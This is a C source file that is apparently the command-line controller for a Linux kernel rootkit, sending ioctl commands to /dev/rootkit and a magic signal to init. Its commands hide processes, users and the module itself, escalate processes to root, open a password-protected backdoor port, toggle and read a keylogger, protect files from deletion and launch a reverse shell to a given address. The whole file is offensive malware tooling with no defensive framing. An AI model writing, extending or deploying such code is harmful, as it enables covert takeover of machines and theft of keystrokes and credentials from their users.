#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <signal.h>
#include "rootkit.h"

static void usage(const char *prog)
{
    printf("Usage: %s <command> [args]\n\n", prog);
    printf("Commands:\n");
    printf("  uid                       Get current UID\n");
    printf("  msg <text>                Set secondary comm channel message\n");
    printf("  hide_pid <pid>            Hide a PID from /proc\n");
    printf("  unhide_pid <pid>          Unhide a PID\n");
    printf("  privesc_pid <pid>         Escalate PID to root\n");
    printf("  privesc_cmd <cmd>         Run command as root\n");
    printf("  backdoor <port>           Open backdoor on port\n");
    printf("  backdoor_pass <pass>      Set backdoor password\n");
    printf("  hide_mod                  Hide module from lsmod\n");
    printf("  show_mod                  Show module in lsmod\n");
    printf("  keylog_toggle             Toggle keylogger on/off\n");
    printf("  keylog_read               Read and flush keylog buffer\n");
    printf("  toggle                    Toggle rootkit via magic signal\n");
    printf("  hide_user <username>      Hide user from /etc/passwd & shadow\n");
    printf("  unhide_user               Stop hiding user\n");
    printf("  protect <filepath>        Protect file from deletion\n");
    printf("  unprotect <filepath>      Remove file protection\n");
    printf("  revshell <ip:port>        Launch reverse shell to target\n");
}

int main(int argc, char *argv[])
{
    struct rk_args args;
    int fd;

    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    /* Toggle doesn't need /dev/rootkit — uses kill signal */
    if (strcmp(argv[1], "toggle") == 0) {
        if (kill(1, RK_MAGIC_SIGNAL) < 0) {
            perror("kill(1, 63)");
            return 1;
        }
        printf("Rootkit toggled via magic signal %d\n", RK_MAGIC_SIGNAL);
        return 0;
    }

    fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0) {
        perror("open /dev/rootkit");
        return 1;
    }

    memset(&args, 0, sizeof(args));

    if (strcmp(argv[1], "uid") == 0) {
        ioctl(fd, RK_CMD_GETUID, &args);
        printf("UID: %lu\n", args.target);

    } else if (strcmp(argv[1], "msg") == 0 && argc >= 3) {
        args.target = (unsigned long)argv[2];
        ioctl(fd, RK_CMD_SET_MSG, &args);
        printf("Message set: %s\n", argv[2]);

    } else if (strcmp(argv[1], "hide_pid") == 0 && argc >= 3) {
        args.target = strtoul(argv[2], NULL, 10);
        if (ioctl(fd, RK_CMD_HIDE_PID, &args) < 0)
            perror("ioctl HIDE_PID");
        else
            printf("PID %lu hidden\n", args.target);

    } else if (strcmp(argv[1], "unhide_pid") == 0 && argc >= 3) {
        args.target = strtoul(argv[2], NULL, 10);
        if (ioctl(fd, RK_CMD_UNHIDE_PID, &args) < 0)
            perror("ioctl UNHIDE_PID");
        else
            printf("PID %lu unhidden\n", args.target);

    } else if (strcmp(argv[1], "privesc_cmd") == 0 && argc >= 3) {
        args.target = (unsigned long)argv[2];
        args.value = RK_PRIVESC_BY_CMD;
        if (ioctl(fd, RK_CMD_PRIVESC, &args) < 0)
            perror("ioctl PRIVESC");
        else
            printf("Command executed as root: %s\n", argv[2]);

    } else if (strcmp(argv[1], "backdoor") == 0 && argc >= 3) {
        args.target = strtoul(argv[2], NULL, 10);
        if (ioctl(fd, RK_CMD_OPEN_BACKDOOR, &args) < 0)
            perror("ioctl OPEN_BACKDOOR");
        else
            printf("Backdoor opened on port %lu\n", args.target);

    } else if (strcmp(argv[1], "backdoor_pass") == 0 && argc >= 3) {
        args.target = (unsigned long)argv[2];
        if (ioctl(fd, RK_CMD_SET_BACKDOOR_PASS, &args) < 0)
            perror("ioctl SET_BACKDOOR_PASS");
        else
            printf("Backdoor password set\n");

    } else if (strcmp(argv[1], "hide_mod") == 0) {
        if (ioctl(fd, RK_CMD_HIDE_MODULE, &args) < 0)
            perror("ioctl HIDE_MODULE");
        else
            printf("Module hidden from lsmod\n");

    } else if (strcmp(argv[1], "show_mod") == 0) {
        if (ioctl(fd, RK_CMD_SHOW_MODULE, &args) < 0)
            perror("ioctl SHOW_MODULE");
        else
            printf("Module visible in lsmod\n");

    } else if (strcmp(argv[1], "keylog_toggle") == 0) {
        if (ioctl(fd, RK_CMD_TOGGLE_KEYLOG, &args) < 0)
            perror("ioctl TOGGLE_KEYLOG");
        else
            printf("Keylogger toggled\n");

    } else if (strcmp(argv[1], "keylog_read") == 0) {
        char buf[4096] = {0};
        args.target = (unsigned long)buf;
        if (ioctl(fd, RK_CMD_GET_KEYLOG, &args) < 0)
            perror("ioctl GET_KEYLOG");
        else
            printf("Keylog:\n%s\n", buf);

    } else if (strcmp(argv[1], "hide_user") == 0 && argc >= 3) {
        args.target = (unsigned long)argv[2];
        if (ioctl(fd, RK_CMD_HIDE_USER, &args) < 0)
            perror("ioctl HIDE_USER");
        else
            printf("User '%s' hidden from /etc/passwd & /etc/shadow\n", argv[2]);

    } else if (strcmp(argv[1], "unhide_user") == 0) {
        args.target = 0;
        if (ioctl(fd, RK_CMD_HIDE_USER, &args) < 0)
            perror("ioctl HIDE_USER");
        else
            printf("User unhidden\n");

    } else if (strcmp(argv[1], "protect") == 0 && argc >= 3) {
        args.target = (unsigned long)argv[2];
        if (ioctl(fd, RK_CMD_PROTECT_FILE, &args) < 0)
            perror("ioctl PROTECT_FILE");
        else
            printf("File '%s' protected from deletion\n", argv[2]);

    } else if (strcmp(argv[1], "unprotect") == 0 && argc >= 3) {
        args.target = (unsigned long)argv[2];
        if (ioctl(fd, RK_CMD_UNPROTECT_FILE, &args) < 0)
            perror("ioctl UNPROTECT_FILE");
        else
            printf("File '%s' unprotected\n", argv[2]);

    } else if (strcmp(argv[1], "revshell") == 0 && argc >= 3) {
        args.target = (unsigned long)argv[2];
        if (ioctl(fd, RK_CMD_REVERSE_SHELL, &args) < 0)
            perror("ioctl REVERSE_SHELL");
        else
            printf("Reverse shell launched to %s\n", argv[2]);

    } else {
        usage(argv[0]);
        close(fd);
        return 1;
    }

    close(fd);
    return 0;
}
